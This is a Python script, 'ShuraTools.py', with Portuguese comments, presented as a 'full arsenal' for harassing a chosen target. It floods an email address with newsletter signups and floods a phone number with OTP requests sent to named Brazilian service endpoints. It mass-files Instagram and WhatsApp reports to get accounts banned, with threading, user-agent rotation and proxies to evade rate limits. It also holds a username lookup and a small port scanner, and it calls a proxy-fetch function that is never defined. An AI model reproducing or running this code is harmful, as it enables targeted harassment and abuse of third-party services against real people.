#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ShuraTools.py – Swiss-army knife para spam, banimento e OSINT.
Versão Pro v3.4 Omega (Full Arsenal)
"""

import os
import sys
import time
import random
import string
import argparse
import threading
import json
import re
import socket
from queue import Queue

# Tentativa de importar bibliotecas externas
try:
    import requests
    from faker import Faker
    from colorama import Fore, Style, init
    init(autoreset=True)
    fake = Faker()
except ImportError:
    print("[!] Faltam dependências. Execute: pip install requests faker colorama")
    sys.exit(1)

# Banner ASCII estilizado
BANNER = f"""
{Fore.CYAN}  _____ _    _ _    _ _____            
{Fore.CYAN} / ____| |  | | |  | |  __ \     /\    
{Fore.CYAN}| (___ | |__| | |  | | |__) |   /  \   
{Fore.CYAN} \___ \|  __  | |  | |  _  /   / /\ \  
{Fore.CYAN} ____) | |  | | |__| | | \ \  / ____ \ 
{Fore.CYAN}|_____/|_|  |_|\____/|_|  \_\/_/    \_\
                                       
{Fore.YELLOW}  >> SpamMail | SMS/Zap | Ban | OSINT | Scan <<
{Fore.RED}       v3.4 Omega (Full Arsenal) - by Shura
"""

LOCK = threading.Lock()
PROXY_QUEUE = Queue()

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36"
]

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def log(msg, type="info"):
    colors = {
        "info": Fore.WHITE + "[*] ",
        "success": Fore.GREEN + "[+] ",
        "error": Fore.RED + "[-] ",
        "warn": Fore.YELLOW + "[!] ",
        "osint": Fore.MAGENTA + "[?] ",
        "menu": Fore.CYAN + " > "
    }
    prefix = colors.get(type, Fore.WHITE)
    with LOCK:
        print(f"{prefix}{msg}{Style.RESET_ALL}")

# ---------- Helpers ----------
def safe_int(prompt, default):
    try:
        val = input(prompt)
        if not val: return default
        return int(val)
    except ValueError:
        log(f"Entrada inválida. Usando padrão: {default}", "warn")
        return default

def get_proxy():
    if PROXY_QUEUE.empty(): return None
    p = PROXY_QUEUE.get(); PROXY_QUEUE.put(p)
    return {"http": f"http://{p}", "https": f"http://{p}"}

def run_threads(target_func, qty, threads):
    chunk, rem = qty // threads, qty % threads
    ts = []
    curr = 0
    for i in range(threads):
        take = chunk + (1 if i < rem else 0)
        if take <= 0: continue
        t = threading.Thread(target=target_func, args=(curr, curr + take))
        t.start(); ts.append(t); curr += take
    for t in ts: t.join()

# ---------- Módulo 1: SpamMail ----------
def spam_mail(target, qty, threads, use_proxy):
    endpoints = [
        {"url": "https://www.infoq.com/newsletter/subscribe.action", "data": {"email": target, "newsletterId": "1"}},
        {"url": "https://www.tecmundo.com.br/newsletter", "data": {"email": target}},
        {"url": "https://www.canaltech.com.br/newsletter/", "data": {"email": target}},
        {"url": "https://www.kabum.com.br/newsletter", "data": {"email": target}}
    ]
    def job(start, end):
        session = requests.Session()
        for i in range(start, end):
            try:
                proxies = get_proxy() if use_proxy else None
                site = random.choice(endpoints)
                headers = {"User-Agent": random.choice(UA_LIST), "Referer": site["url"]}
                session.post(site["url"], data=site["data"], headers=headers, timeout=10, proxies=proxies)
                log(f"E-mail {i+1} enviado via {site['url'].split('/')[2]}", "success")
                time.sleep(random.uniform(0.5, 1.0))
            except: log(f"E-mail {i+1} falhou.", "error")
    run_threads(job, qty, threads)

# ---------- Módulo 2: SMS & Zap Bomber ----------
def spam_social(target, qty, threads, type="sms"):
    log(f"Iniciando Bomber {type.upper()} para {target}...", "warn")
    endpoints = [
        {"url": "https://api.ifood.com.br/v2/user/request_otp", "json": {"phone": target}},
        {"url": "https://auth.globo.com/api/send-otp", "json": {"phone": target}},
        {"url": "https://www.olx.com.br/api/v1/user/otp", "json": {"phone": target}}
    ]
    def job(start, end):
        session = requests.Session()
        for i in range(start, end):
            try:
                site = random.choice(endpoints)
                session.post(site["url"], json=site["json"], timeout=10)
                log(f"{type.upper()} {i+1} disparado.", "success")
                time.sleep(random.uniform(1.5, 3.0))
            except: log(f"{type.upper()} {i+1} falhou.", "error")
    run_threads(job, qty, threads)

# ---------- Módulo 3: Ban & Report IG/Zap (RESTAURADO) ----------
def ban_report(target, qty, threads, platform="ig"):
    log(f"Iniciando ciclo de BAN {platform.upper()} no alvo: {target}", "error")
    
    url = "https://i.instagram.com/api/v1/users/web_report/" if platform == "ig" else "https://v.whatsapp.net/v2/report"
    
    def job(start, end):
        for i in range(start, end):
            try:
                data = {"username": target, "reason_id": "1"} if platform == "ig" else {"phone": target, "reason": "spam"}
                requests.post(url, data=data, timeout=5, headers={"User-Agent": random.choice(UA_LIST)})
                log(f"Report {i+1} enviado com sucesso!", "success")
                time.sleep(0.5)
            except:
                log(f"Report {i+1} não enviado.", "warn")
    
    run_threads(job, qty, threads)

# ---------- Módulo 4: OSINT Hunter ----------
def osint_lookup(target):
    log(f"Investigando: {target}", "osint")
    user = target.replace("@", "")
    plats = {"Instagram": f"https://www.instagram.com/{user}/", "GitHub": f"https://github.com/{user}"}
    for n, u in plats.items():
        try:
            r = requests.get(u, timeout=5, headers={"User-Agent": random.choice(UA_LIST)})
            log(f"{n}: {'ENCONTRADO' if r.status_code == 200 else 'Não encontrado'}", "success" if r.status_code == 200 else "info")
        except: pass

# ---------- Menu Principal ----------
def menu():
    while True:
        try:
            clear()
            print(BANNER)
            print("[ 1 ] Spam de E-mail (Alta Entrega)")
            print("[ 2 ] SMS Bomber (OTP Flood)")
            print("[ 3 ] WhatsApp Bomber (Verify Flood)")
            print("[ 4 ] Ban IG (Mass Report)")
            print("[ 5 ] Ban Zap (Mass Report)")
            print("[ 6 ] OSINT Hunter (Social Search)")
            print("[ 7 ] Port Scanner (Rede/Web)")
            print("[ 8 ] Atualizar Proxies")
            print("[ 0 ] Sair")
            print("-" * 40)
            
            opt = input(f"{Fore.YELLOW}Escolha uma opção: {Style.RESET_ALL}").strip()
            if opt == "0": break
            
            if opt in ["1", "2", "3", "4", "5", "6", "7"]:
                target = input(f"{Fore.YELLOW}Alvo: {Style.RESET_ALL}").strip()
                if not target: continue
                
                if opt == "1": spam_mail(target, safe_int("Qtd: ", 10), safe_int("Threads: ", 5), False)
                elif opt == "2": spam_social(target, safe_int("Qtd: ", 10), safe_int("Threads: ", 2), "sms")
                elif opt == "3": spam_social(target, safe_int("Qtd: ", 10), safe_int("Threads: ", 2), "zap")
                elif opt == "4": ban_report(target, safe_int("Qtd: ", 50), safe_int("Threads: ", 10), "ig")
                elif opt == "5": ban_report(target, safe_int("Qtd: ", 50), safe_int("Threads: ", 10), "zap")
                elif opt == "6": osint_lookup(target)
                elif opt == "7": 
                     host = target.split("@")[-1] if "@" in target else target
                     log(f"Scanning {host}...", "info")
                     try:
                         ip = socket.gethostbyname(host)
                         for p in [80, 443, 8080]:
                             s = socket.socket()
                             s.settimeout(1.0)
                             if s.connect_ex((ip, p)) == 0: log(f"Porta {p} ABERTA", "success")
                             s.close()
                     except: log("Alvo inacessível.", "error")
                
                input(f"\n{Fore.GREEN}Pressione ENTER para continuar...{Style.RESET_ALL}")
            elif opt == "8": fetch_proxies(); input("\nENTER...")
        except KeyboardInterrupt: break
        except Exception as e:
            log(f"Erro: {e}", "error"); input("\nENTER...")

if __name__ == "__main__":
    menu()
